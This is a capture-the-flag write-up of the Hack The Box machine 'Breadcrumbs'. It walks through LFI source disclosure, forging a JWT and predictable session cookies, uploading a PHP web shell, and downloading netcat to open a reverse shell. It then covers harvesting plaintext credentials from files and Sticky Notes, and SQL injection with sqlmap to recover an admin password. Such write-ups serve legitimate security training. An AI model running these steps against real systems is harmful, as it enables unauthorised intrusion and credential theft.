---
title:     "Hack The Box - Breadcrumbs"
tags: [windows,hard,web,lfi,slqi,sticky notes,aes,reversing,jwt]
categories: HackTheBox
---
[![info_card.png](/img/breadcrumbs/info_card.png)](/img/breadcrumbs/info_card.png)


Breadcrumbs is a hard rated machine on HackTheBox created by [helich0pper](https://www.hackthebox.eu/home/users/profile/163104). For the user part we will exploit a LFI in a webapp to get access to the php source code. With this we can forge two cookies to impersonate an admin user and upload a web shell. On the box we will  find a password for the user juliette which has a sticky note containing the credentials for the development account. As the development account we have access to a binary which we can reverse to find a service running on localhost. Forwarding it to our machine we can perform SQL injection on the database to retrieve the administrators encrypted password with the AES key to decrypt it.

# User

## Nmap

As usual we start our enumeration off with a nmap scan against all ports, followed by a script and version detection scan against the open ones.

`All ports`
```
$ sudo nmap -p- -T4 10.129.175.242 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 08:06 BST
Nmap scan report for 10.129.175.242
Host is up (0.12s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 59.63 seconds
           Raw packets sent: 65663 (2.889MB) | Rcvd: 65695 (2.655MB)
```

`Script and version`
```
$ sudo nmap -p 22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 -sC -sV 10.129.175.242 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 08:08 BST
Nmap scan report for 10.129.175.242
Host is up (0.030s latency).

PORT      STATE  SERVICE       VERSION
22/tcp    open   ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp    open   http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open   ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open   microsoft-ds?
3306/tcp  open   mysql?
5040/tcp  open   unknown
7680/tcp  closed pando-pub
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m22s
| smb2-security-mode: 
|   2.02:
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-17T07:12:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.54 seconds
```


## Library

HTTP and HTTPS look particularily interesting so we will start there. Going over to the website served on port 80 we see the homepage of a book library.

[![home.png](/img/breadcrumbs/home.png)](/img/breadcrumbs/home.png)

Clicking on `Check books` we can query the database for a book by Title and Author.

[![search_book.png](/img/breadcrumbs/search_book.png)](/img/breadcrumbs/search_book.png)

We click on the `Book` action and send it to Burp repeater to mess around with it.

[![book_book.png](/img/breadcrumbs/book_book.png)](/img/breadcrumbs/book_book.png)

Entering invalid data for the `book` parameter we can provoke an error which gives us valuable information about the function getting called and the current working directory we are in.

[![file_get_contents.png](/img/breadcrumbs/file_get_contents.png)](/img/breadcrumbs/file_get_contents.png)

Testing for LFI on the `index.php` file we get a result back and the php code is getting displayed aswell.

[![include_php_poc.png](/img/breadcrumbs/include_php_poc.png)](/img/breadcrumbs/include_php_poc.png)

Having a method to retrieve source code from the webpage we need to figure out what we want to look at. For this we start a gobuster scan on the web page. 

```
$ gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://10.129.175.242/ -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.175.242/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/07/17 08:17:18 Starting gobuster in directory enumeration mode
===============================================================
/includes             (Status: 301) [Size: 343] [--> http://10.129.175.242/includes/]
/.html                (Status: 403) [Size: 303]
/.html.php            (Status: 403) [Size: 303]
/js                   (Status: 301) [Size: 337] [--> http://10.129.175.242/js/]
/index.php            (Status: 200) [Size: 2368]
/css                  (Status: 301) [Size: 338] [--> http://10.129.175.242/css/]
/.htm.php             (Status: 403) [Size: 303]
/.htm                 (Status: 403) [Size: 303]
/db                   (Status: 301) [Size: 337] [--> http://10.129.175.242/db/]
/php                  (Status: 301) [Size: 338] [--> http://10.129.175.242/php/]
/webalizer            (Status: 403) [Size: 303]
/.                    (Status: 200) [Size: 2368]
/portal               (Status: 301) [Size: 341] [--> http://10.129.175.242/portal/]
/phpmyadmin           (Status: 403) [Size: 303]
/.htaccess.php        (Status: 403) [Size: 303]
/.htaccess            (Status: 403) [Size: 303]
/books                (Status: 301) [Size: 340] [--> http://10.129.175.242/books/]
/examples             (Status: 503) [Size: 403]
/.htc                 (Status: 403) [Size: 303]
/.htc.php             (Status: 403) [Size: 303]
```

Going over to the `portal` link, there is a login portal for the website.

[![portal.png](/img/breadcrumbs/portal.png)](/img/breadcrumbs/portal.png)

Clicking on helper we get displayed the current active users in case we would need help with the service, which is indeed very helpful for us.

[![logged_in.png](/img/breadcrumbs/logged_in.png)](/img/breadcrumbs/logged_in.png)

The application lets us also create a user, which we do in a next step to check for additional functionality. After creating our account and logging in we see that sessions are managed by two cookies `PHPSESSID` and `token`.

[![cookies.png](/img/breadcrumbs/cookies.png)](/img/breadcrumbs/cookies.png)

We now have access to the `User managment` functionality which gives us information about the roles of the registered users. Combined with the earlier information about online users, this results in paul being a good target if we are able to impersonate him since he is online and a site administrator.

[![usermgmt.png](/img/breadcrumbs/usermgmt.png)](/img/breadcrumbs/usermgmt.png)

To get more information about the session handling we use the earlier discovered LFI to retrieve the `login.php` file. This reveals another php file being included.

[![login.png](/img/breadcrumbs/login.png)](/img/breadcrumbs/login.png)

Checking out the `authController.php` and formatting it into a more readable format we see how the JWT is generated and also find the hardcoded secret to sign it.

[![authController.png](/img/breadcrumbs/authController.png)](/img/breadcrumbs/authController.png)

We should now be able to generate one of the two cookies so let's get the source for the next one.

`authController`

```php
<?php 
require 'db/db.php';
require "cookie.php";
require "vendor\/autoload.php";
use \Firebase\JWT\JWT;

$errors = array();
$username = "";
$userdata = array();
$valid = false;
$IP = $_SERVER['REMOTE_ADDR'];

//if user clicks on login
if($_SERVER['REQUEST_METHOD'] === "POST"){
    if($_POST['method'] == 0){
        $username = $_POST['username'];
        $password = $_POST['password'];

        $query = "SELECT username,position FROM users WHERE username=? LIMIT 1";
        $stmt = $con->prepare($query);
        $stmt->bind_param('s', $username);
        $stmt->execute();
        $result = $stmt->get_result();
        while ($row = $result->fetch_array(MYSQLI_ASSOC)){
            array_push($userdata, $row);
        }
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $password = sha1($password);
            $passwordQuery = "SELECT * FROM users WHERE password=? AND username=? LIMIT 1";
            $stmt = $con->prepare($passwordQuery);
            $stmt->bind_param('ss', $password, $username);
            $stmt->execute();
            $result = $stmt->get_result();

            if($result->num_rows > 0){
                $valid = true;
            }
            $stmt->close();
        }

        if($valid){
            session_id(makesession($username));
            session_start();

            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
            $data = array();

            $payload = array(
                "data" => array(
                    "username" => $username
            ));

            $jwt = JWT::encode($payload, $secret_key, 'HS256');

            setcookie("token", $jwt, time() + (86400 * 30), "\/");

            $_SESSION['username'] = $username;
            $_SESSION['loggedIn'] = true;
            if($userdata[0]['position'] == ""){
                $_SESSION['role'] = "Awaiting approval";
            } 
            else{
                $_SESSION['role'] = $userdata[0]['position'];
            }

            header("Location: /portal");
        }

        else{
            $_SESSION['loggedIn'] = false;
            $errors['valid'] = "Username or Password incorrect";
        }
    }

    elseif($_POST['method'] == 1){
        $username=$_POST['username'];
        $password=$_POST['password'];
        $passwordConf=$_POST['passwordConf'];

        if(empty($username)){
            $errors['username'] = "Username Required";
        }
        if(strlen($username) < 4){
            $errors['username'] = "Username must be at least 4 characters long";
        }
        if(empty($password)){
            $errors['password'] = "Password Required"; 
        }
        if($password !== $passwordConf){
            $errors['passwordConf'] = "Passwords don't match!"; 
        }

        $userQuery = "SELECT * FROM users WHERE username=? LIMIT 1";
        $stmt = $con->prepare($userQuery);
        $stmt ->bind_param('s',$username);
        $stmt->execute();
        $result = $stmt->get_result();
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $errors['username'] = "Username already exists";
        }

        if(count($errors) === 0){
            $password = sha1($password);
            $sql = "INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')";
            $stmt = $con->prepare($sql);
            $stmt ->bind_param('ss', $username, $password);

            if ($stmt->execute()){
                $user_id = $con->insert_id;
                header('Location: login.php');
            }
            else{
               $_SESSION['loggedIn'] = false;
                $errors['db_error']="Database error: failed to register";
            }
        }
    }
} 
```

The authController.php includes the `cookie.php` file which in turn reveals how the second cookie is generated. A letter of the username is randomly chosen and placed between two hardcoded strings. After that the string is hashed and placed after the username. Since `paul` has only four letters this leaves use with only four possible cookies.

[![cookie.png](/img/breadcrumbs/cookie.png)](/img/breadcrumbs/cookie.png)

`cookie.php`
```php
<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```

We can modify the `cookie.php` to print all possible cookie values.

```php
<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    for($x = 0; $x < strlen($username); $x++)
    {
      $key = "s4lTy_stR1nG_".$username[$x]."(!528./9890";
      $session_cookie = $username.md5($key);

      echo "$session_cookie\n";
    }
}

makesession("paul");
?>
```

```
$ php cookie.php
paul13908e17855ef656db3e2d5ddc2a1efc
pauld78f5990e1f882f0d9c2fb6947dee56d
paul76af6bfe49dec2b67a6ee399a2e6fbed
paul5a85be61b78600e1e81af105cb377653
```

Next we generate the JWT token with a short python script.

```py
import jwt

encoded_jwt = jwt.encode({"data": {"username" : "paul" } }, "6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e", algorithm="HS256")
print(encoded_jwt)
```

```
$ python gen_jwt.py 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
```

Replacing our cookies with the JWT and the ones for paul we see that one cookie works and we are logged in as admin.

[![logged_paul.png](/img/breadcrumbs/logged_paul.png)](/img/breadcrumbs/logged_paul.png)

As admin we now have access to the `File managment` functionality which looks readily exploitable.

[![file_mgmt.png](/img/breadcrumbs/file_mgmt.png)](/img/breadcrumbs/file_mgmt.png)

In a first upload we try to upload a simple php web shell which fails stating `Missing file or title`. We do however get the filepath of where the shell will be uploaded to if successfull.

[![upload_blocked.png](/img/breadcrumbs/upload_blocked.png)](/img/breadcrumbs/upload_blocked.png)

The error message could mean that our web shell got filtered by some blacklist so we modify it to use `shell_exec` instead of `system` and try again.

[![upload_success.png](/img/breadcrumbs/upload_success.png)](/img/breadcrumbs/upload_success.png)

This time it worked and our webshell gets uploaded. Opening it up in the browser with the command `whoami` we see we have code execution and can start working on a reverse shell.

[![rce_poc.png](/img/breadcrumbs/rce_poc.png)](/img/breadcrumbs/rce_poc.png)

For this we serve a windows netcat executable on a python webserver, where we download it with powershell using `iwr` to a folder which almost always has write permissions.

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

[![upload_nc.png](/img/breadcrumbs/upload_nc.png)](/img/breadcrumbs/upload_nc.png)

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.175.242 - - [17/Jul/2021 10:19:13] "GET /nc.exe HTTP/1.1" 200 -
```

With netcat uploaded we can now send a reverse shell back to us. First we set up a listener.

```
$ sudo rlwrap  nc -lvnp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```

Then we send us a powershell shell back with netcat to our listener.

[![get_shell.png](/img/breadcrumbs/get_shell.png)](/img/breadcrumbs/get_shell.png)

```
$ sudo rlwrap  nc -lvnp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.175.242.
Ncat: Connection from 10.129.175.242:53832.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

whoami
whoami
breadcrumbs\www-data
PS C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads>
```

## Pizza

Looking around there is an odd looking folder which has mostly similar files with just one standing out. Looking at the content of the file we find the credentials for the user `juliette`.

```
dir


    Directory: C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/28/2020   1:48 AM            170 alex.disabled
-a----        11/28/2020   1:48 AM            170 emma.disabled
-a----        11/28/2020   1:48 AM            170 jack.disabled
-a----        11/28/2020   1:48 AM            170 john.disabled
-a----         1/17/2021   3:11 PM            192 juliette.json
-a----        11/28/2020   1:48 AM            170 lucas.disabled
-a----        11/28/2020   1:48 AM            170 olivia.disabled
-a----        11/28/2020   1:48 AM            170 paul.disabled
-a----        11/28/2020   1:48 AM            170 sirine.disabled
-a----        11/28/2020   1:48 AM            170 william.disabled


type juliette.json
type juliette.json
{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}
PS C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>
```

Since SSH is open we can use it as an easy method to access the machine as juliette.

```
$ssh juliette@10.129.175.242
The authenticity of host '10.129.175.242 (10.129.175.242)' can't be established.
ECDSA key fingerprint is SHA256:JpPYtFfyEYypgrRNtWR/Ekn1RM4ltgVxa41kmIxpkoY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.175.242' (ECDSA) to the list of known hosts.
juliette@10.129.175.242's password: 
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

juliette@BREADCRUMBS C:\Users\juliette>
```

Now we can grab the user flag on her Desktop.

```
juliette@BREADCRUMBS C:\Users\juliette\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\juliette\Desktop

01/15/2021  05:04 PM    <DIR>          .
01/15/2021  05:04 PM    <DIR>          ..
12/09/2020  07:27 AM               753 todo.html
07/17/2021  12:01 AM                34 user.txt
               2 File(s)            787 bytes
               2 Dir(s)   6,484,484,096 bytes free

```

# Root

## Sticky notes

There is also a `todo.html` in her desktop. The todo list states she plans on moving her passwords from sticky notes into a password manager, which means there should be currently more passwords in a sticky note on her desktop.

```
juliette@BREADCRUMBS C:\Users\juliette\Desktop>type todo.html
<html>
<style>
html{
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>
```

Going over to the AppData folder for sticky notes we see a note present.

```
juliette@BREADCRUMBS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

01/15/2021  05:10 PM    <DIR>          .
01/15/2021  05:10 PM    <DIR>          ..
01/15/2021  05:10 PM            20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
11/29/2020  04:10 AM             4,096 plum.sqlite
01/15/2021  05:10 PM            32,768 plum.sqlite-shm
01/15/2021  05:10 PM           329,632 plum.sqlite-wal
               4 File(s)        386,976 bytes
               2 Dir(s)   6,482,231,296 bytes free
```

We could download this and open the sqlite database but for simplicty and since it is stored in plaintext, we simply switch to powershell in the SSH shell and cat the content to the screen. 
Right at the bottom we see the credentials for the development account `development:fN3)sN5Ee@g`. The administrator account is also mentioned but there are no credentials present for it.

```
PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> cat .\plum.sqlite-wal
...[snip]...
☺♫¹♫¹☺Ãƒ◄‚#    UU♠♠\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
\id=fc0d8d70-055d-4870-a5de-d76943a‚D☺¶ƒ◄-     UU♠♠\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]ManagedPosition=Yellow0c32c3d8-7c60-48ae-939e-798df198cfe78e814e57-9d28-4288-961c-31c806338c5Ø”ýDBjØ”ýPR
```

## Credentials manager

Logging in via SSH with our new acount we can see a custom looking binary in the `C:\development` folder.

```
$ ssh development@10.129.175.242
development@10.129.175.242's password:
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

development@BREADCRUMBS C:\Users\development>
```

```
PS C:\Development> dir


    Directory: C:\Development


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/29/2020   3:11 AM          18312 Krypter_Linux

```

To inspect it better we copy it over to our local machine setting up a smbserver with impacket and mounting the share on the windows machine.

```
$sudo smbserver.py -smb2support files .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now we can simply copy it over to our machine.

```
PS C:\Development> net use y: \\10.10.14.11\files
The command completed successfully.

PS C:\Development> cp .\Krypter_Linux y:
```

Looking at the binary in ghidra we see port `1234` mentioned and that a valid query is structured like `method=select&username=administrator&table=passwords`.

[![ghidra_krypter.png](/img/breadcrumbs/ghidra_krypter.png)](/img/breadcrumbs/ghidra_krypter.png)

Checking open ports on the machine we see that port 1234 is indeed listening on localhost of the machine.

```
development@BREADCRUMBS C:\Users\development>netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
...[snip]...
  TCP    127.0.0.1:1234         0.0.0.0:0              LISTENING
...[snip]...
```

To access it from our machine we forward it through the SSH tunnel. To enter the SSH command line press `~C` on a new line.

```
PS C:\Users\development> 
ssh> -L:1234:127.0.0.1:1234
Forwarding port.

```

Curling the service now with the earlier found query we get what looks like an AES key.

```
$ curl 'localhost:1234/index.php?method=select&username=administrator&table=passwords'
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```

Since it is making database queries it might we vulnerable to SQL injection. Running sqlmap against it we quickly retrieve the database with the encrypted administrator password.

```
$ sqlmap --level 5 --risk 3 -u 'http://localhost:1234/index.php?method=select&username=administrator&table=passwords'
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not re
sponsible for any misuse or damage caused by this program

[*] starting @ 11:01:58 /2021-07-17/

...[snip]...
[11:02:06] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[11:02:06] [INFO] fetching current database
[11:02:06] [INFO] fetching tables for database: 'bread'
[11:02:06] [INFO] fetching columns for table 'passwords' in database 'bread'
[11:02:06] [INFO] fetching entries for table 'passwords' in database 'bread'
[11:02:06] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: bread
Table: passwords
[1 entry]
+----+---------------+------------------+----------------------------------------------+
| id | account       | aes_key          | password                                     |
+----+---------------+------------------+----------------------------------------------+
| 1  | Administrator | k19D193j.<19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |
+----+---------------+------------------+----------------------------------------------+

[11:02:15] [INFO] table 'bread.passwords' dumped to CSV file '/home/jack/.local/share/sqlmap/output/localhost/dump/bread/passwords.csv'
[11:02:15] [INFO] fetched data logged to text files under '/home/jack/.local/share/sqlmap/output/localhost'

[*] ending @ 11:02:15 /2021-07-17/
```

There are multiple ways to decrypt it, one of the easiest is using cyberchef. We fill in all the values after decoding the base64 password. We also set the IV to all 0's. Upon filling in the whole recipe cyberchef starts the decryption automatically.

```
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'Latin1','string':'k19D193j.%3C19391('%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=SDJkRnovak53dFNUV0RVUm90OUpCaFdNUDZYT2RtY3BncXZZSEczNVFLdz0
```

[![cyberchef.png](/img/breadcrumbs/cyberchef.png)](/img/breadcrumbs/cyberchef.png)

The password indeed works and we can log into the machine as the administrator user. Now we are able to add the `root.txt` from the administrators desktop to our collection.

```
$ssh administrator@10.129.175.242
administrator@10.129.175.242's password: 
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

administrator@BREADCRUMBS C:\Users\Administrator>
```

```
administrator@BREADCRUMBS C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\Administrator\Desktop

02/09/2021  08:08 AM    <DIR>          .
02/09/2021  08:08 AM    <DIR>          ..
01/15/2021  05:03 PM    <DIR>          passwordManager
07/17/2021  12:01 AM                34 root.txt
               1 File(s)             34 bytes
               3 Dir(s)   6,479,138,816 bytes free 
```
